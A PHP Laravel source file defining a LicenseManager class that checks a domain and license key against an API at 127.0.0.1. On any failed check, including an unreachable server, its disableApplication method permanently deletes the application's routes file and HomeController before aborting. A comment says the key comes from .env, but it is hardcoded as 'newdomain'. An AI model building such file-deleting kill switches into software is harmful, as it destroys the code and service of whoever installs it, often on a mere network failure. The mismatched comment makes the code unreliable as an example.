<?php
namespace zPlus\Licensing;

use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Cache;

class LicenseManager
{
    protected $masterApiUrl = 'http://127.0.0.1:8000/api/whitelist';

    public function verifyLicense()
    {
        // Cache to minimize API calls
        if (Cache::has('license_verification')) {
            if (Cache::get('license_verification') === 'invalid') {
                $this->disableApplication();
            }
            return;
        }

        // Verify license with the master API
        $domain = request()->getHost();
        $licenseKey = 'newdomain'; // License key stored in .env

        $response = Http::post($this->masterApiUrl, [
            'domain' => $domain,
            'license_key' => $licenseKey,
        ]);

        if ($response->json('status') === 'success') {
            Cache::put('license_verification', 'valid', now()->addMinutes(1));
        } else {
            Cache::put('license_verification', 'invalid', now()->addMinutes(1));
            $this->disableApplication();
        }
    }

    protected function disableApplication()
    {
        // Disable critical files
        File::delete(base_path('routes/web.php'));
        File::delete(base_path('app/Http/Controllers/HomeController.php'));
        abort(403, 'License verification failed. Contact support.');
    }
}
